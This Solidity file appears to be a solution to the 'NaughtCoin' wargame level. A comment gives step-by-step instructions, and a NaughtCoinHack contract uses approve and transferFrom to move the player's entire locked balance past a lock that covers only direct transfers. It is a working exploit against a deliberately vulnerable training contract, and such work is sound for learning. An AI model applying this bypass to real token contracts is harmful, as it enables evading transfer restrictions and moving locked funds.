/**
 * How to beat this level:
 * 1) Deploy NaughtCoinHack
 * 2) Call balanceOf() on NaughtCoin with your EOA's address
 * 3) Call approve() on NaughtCoin with the balance from 2) and the contract address of NaughtCoinHack
 * 4) Call attack()
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function player() external view returns (address);
}

contract NaughtCoinHack {
    function attack(address _target) external {
        INaughtCoin target = INaughtCoin(_target);
        address player = target.player();
        uint256 amount = target.balanceOf(player);
        target.transferFrom(player, address(this), amount);
    }
}
